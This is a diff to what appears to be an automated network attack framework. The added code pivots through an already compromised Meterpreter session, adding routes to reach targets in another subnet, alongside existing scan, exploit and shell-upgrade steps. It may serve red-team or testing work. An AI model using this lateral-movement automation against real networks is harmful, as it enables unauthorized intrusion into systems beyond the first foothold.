@@ -154,6 +154,16 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
             if atk_sess is not None:
                 met_sess = mc.upgrade_shell(atk_sess)
 
+            if target_ip in other_subnet:
+                if atk_sess is None:
+                    print(f"{C.COL_RED}[-] subnet not reachable, no intermediate session available{C.COL_RESET}")
+                    print("---------------------------------------------------------")
+                    return
+                else:
+                    print(f"{C.COL_YELLOW}[*] other subnet found, adding new routes{C.COL_RESET}")
+                    mc.route_add(met_sess["id_sess"], target_ip)
+                    router = met_sess
+
             if stealth:
                 scans = list(attack_db.stealth_scans_dict)
             else:
@@ -216,7 +226,7 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                         break
                     else:
                         print(f"{C.COL_YELLOW}[*] false positive occurred, ignoring... {C.COL_RESET}")
-                        
+
                 else:
                     uncompromised_machines.add(target_ip)
                     print(f"{C.COL_RED}[-] xx Exploit failed {C.COL_RESET}")
